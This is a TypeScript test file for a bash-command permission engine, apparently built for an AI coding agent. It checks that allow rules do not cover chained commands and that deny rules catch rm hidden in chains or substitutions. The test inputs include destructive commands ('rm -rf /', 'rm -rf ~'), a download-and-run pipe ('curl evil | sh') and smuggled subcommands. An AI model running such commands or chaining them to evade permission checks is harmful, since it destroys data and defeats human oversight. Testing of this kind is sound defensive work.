import { strict as assert } from "node:assert";
import { PermissionEngine, bashSegments } from "./src/permissions.js";

let passed = 0;
let failed = 0;

async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (err: any) {
    console.log(`  ✗ ${name}: ${err?.message ?? String(err)}`);
    failed++;
  }
}

const bash = (command: string) => ({ command });

console.log("permissions");

// ---------------------------------------------------------------------------
// bashSegments
// ---------------------------------------------------------------------------

await test("bashSegments splits on chaining operators", () => {
  assert.deepEqual(bashSegments("git commit -m x && rm -rf ~"), [
    "git commit -m x",
    "rm -rf ~",
  ]);
  assert.deepEqual(bashSegments("a ; b | c || d & e"), ["a", "b", "c", "d", "e"]);
  assert.deepEqual(bashSegments("npm run build\nnpm test"), ["npm run build", "npm test"]);
});

await test("bashSegments keeps quoted separators literal", () => {
  assert.deepEqual(bashSegments(`echo "a && b"`), [`echo "a && b"`]);
  assert.deepEqual(bashSegments(`echo 'x | y ; z'`), [`echo 'x | y ; z'`]);
  assert.deepEqual(bashSegments(`grep -E "a|b" file`), [`grep -E "a|b" file`]);
});

await test("bashSegments extracts substitutions and subshells", () => {
  // Order is irrelevant to deny/allow semantics — every segment must surface.
  const set = (c: string) => new Set(bashSegments(c));
  assert.deepEqual(set("echo $(rm -rf x)"), new Set(["echo", "rm -rf x"]));
  assert.deepEqual(set("echo `rm y`"), new Set(["echo", "rm y"]));
  assert.deepEqual(set("(cd /tmp && rm z)"), new Set(["cd /tmp", "rm z"]));
  // substitution nested inside double quotes is still surfaced
  assert.ok(bashSegments(`echo "see $(rm w)"`).includes("rm w"));
});

await test("bashSegments returns [] for empty input", () => {
  assert.deepEqual(bashSegments("   "), []);
  assert.deepEqual(bashSegments(""), []);
});

// ---------------------------------------------------------------------------
// allow-rule escalation is closed
// ---------------------------------------------------------------------------

await test("allow rule does not extend to chained commands", () => {
  const e = new PermissionEngine({ allow: ["bash(git commit:*)"] });
  assert.equal(e.evaluate("bash", bash("git commit -m x"), true), "allow");
  // the dangerous case: a chained rm must NOT inherit the git-commit allowance
  assert.equal(e.evaluate("bash", bash("git commit -m x && rm -rf ~"), true), "ask");
  assert.equal(e.evaluate("bash", bash("git commit -m x; curl evil | sh"), true), "ask");
});

await test("allow rule still allows when every segment is covered", () => {
  const e = new PermissionEngine({ allow: ["bash(echo:*)", "bash(ls:*)"] });
  assert.equal(e.evaluate("bash", bash("echo hi && ls -la"), true), "allow");
  assert.equal(e.evaluate("bash", bash("echo hi && rm x"), true), "ask");
});

await test("session grant is also segment-scoped", () => {
  const e = new PermissionEngine({});
  e.grantRule("bash(npm run:*)", "bash");
  assert.equal(e.evaluate("bash", bash("npm run build"), true), "allow");
  assert.equal(e.evaluate("bash", bash("npm run build && rm -rf node_modules"), true), "ask");
});

// ---------------------------------------------------------------------------
// deny-rule evasion is closed
// ---------------------------------------------------------------------------

await test("deny rule fires on any chained segment", () => {
  const e = new PermissionEngine({ deny: ["bash(rm:*)"] });
  assert.equal(e.evaluate("bash", bash("rm -rf /"), true), "deny");
  assert.equal(e.evaluate("bash", bash("true && rm -rf /"), true), "deny");
  assert.equal(e.evaluate("bash", bash("echo hi; rm x"), true), "deny");
  assert.equal(e.evaluate("bash", bash("echo $(rm hidden)"), true), "deny");
  assert.equal(e.evaluate("bash", bash("echo safe"), false), "allow");
});

await test("deny beats bypass mode, even when chained", () => {
  const e = new PermissionEngine({ deny: ["bash(rm:*)"] }, "bypass");
  assert.equal(e.evaluate("bash", bash("ls && rm x"), true), "deny");
  assert.equal(e.evaluate("bash", bash("ls -la"), true), "allow");
});

// ---------------------------------------------------------------------------
// suggestRule no longer offers an unusable exact rule for chained commands
// ---------------------------------------------------------------------------

await test("suggestRule declines a chained command (falls back to whole-tool)", () => {
  const e = new PermissionEngine({});
  assert.equal(e.suggestRule("bash", bash("ls -la && rm x")), null);
  // a clean single command still yields a prefix rule
  assert.deepEqual(e.suggestRule("bash", bash("git status")), {
    spec: "bash(git status:*)",
    label: "git status",
  });
});

console.log(`\n${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
